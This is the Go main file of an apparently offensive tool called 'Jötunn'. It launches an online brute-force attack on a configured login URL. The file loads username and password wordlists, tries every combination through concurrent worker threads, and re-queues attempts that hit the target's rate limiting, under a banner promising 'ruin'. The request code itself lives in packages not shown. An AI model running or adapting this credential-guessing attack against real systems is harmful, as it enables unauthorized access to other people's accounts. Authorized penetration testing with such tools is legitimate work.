package main

import (
	"os"
	"sync"
	"time"

	"github.com/LinharesAron/jotunn/internal/attack"
	"github.com/LinharesAron/jotunn/internal/config"
	"github.com/LinharesAron/jotunn/internal/io"
	"github.com/LinharesAron/jotunn/internal/logger"
)

func main() {

	cfg := config.Load()

	logger.Init(cfg.LogFile)

	logger.Info("🔥 Jötunn – From the blood of giants, only ruin will remains 🔥")
	logger.Info("Starting attack on: %s", cfg.URL)
	logger.Info("Method: %s | Threads: %d", cfg.Method, cfg.Threads)
	logger.Info("Users: %s | Passwords: %s\n", cfg.UserList, cfg.PassList)

	start := time.Now()
	logger.Info("[~] Loading wordlists and initializing...")

	users, err := io.ReadLines(cfg.UserList)
	if err != nil {
		logger.Error("[!] Failed to read users file: %v", err)
		os.Exit(1)
	}

	passwords, err := io.ReadLines(cfg.PassList)
	if err != nil {
		logger.Error("[!] Failed to read passwords file: %v", err)
		os.Exit(1)
	}

	logger.Info("[~] Starting the BruteForce...")
	logger.InitProgressTracker(len(users) * len(passwords))

	jobs := make(chan attack.Attempt, 1000)
	var wg sync.WaitGroup

	retries := make(chan attack.Attempt, 1000)
	var relayWg sync.WaitGroup
	relayWg.Add(1)

	limiter := attack.NewRateLimitManager(cfg.Threshold, cfg.RateLimitStatusCodes)

	go func() {
		defer relayWg.Done()
		for attempt := range retries {
			jobs <- attempt
		}
	}()

	for i := range cfg.Threads {
		wg.Add(1)
		go attack.Worker(i, cfg, jobs, retries, &wg, limiter)
	}

	for _, user := range users {
		for _, pass := range passwords {
			jobs <- attack.Attempt{Username: user, Password: pass}
		}
	}

	wg.Wait()
	close(retries)

	relayWg.Wait()
	close(jobs)

	duration := time.Since(start)
	logger.Info("✅ Done in %s", duration)
}
